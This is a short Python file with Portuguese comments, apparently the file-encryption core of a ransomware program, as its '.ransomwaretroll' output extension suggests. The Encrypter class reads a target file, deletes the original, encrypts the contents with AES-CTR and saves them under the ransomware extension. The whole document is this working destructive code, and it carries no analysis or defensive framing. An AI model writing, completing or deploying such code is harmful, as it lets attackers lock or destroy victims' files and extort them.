import os
import pyaes

class Encrypter:
    def __init__(self, file_name, key):
        self.file_name = file_name
        self.key = key

    def encrypt(self):
        # Abrir o arquivo a ser criptografado
        with open(self.file_name, "rb") as file:
            file_data = file.read()
        
        # Remover o arquivo original
        os.remove(self.file_name)
        
        # Criptografar os dados
        aes = pyaes.AESModeOfOperationCTR(self.key)
        crypto_data = aes.encrypt(file_data)
        
        # Salvar o arquivo criptografado
        new_file_name = self.file_name + ".ransomwaretroll"
        with open(new_file_name, "wb") as new_file:
            new_file.write(crypto_data)
        
        return new_file_name
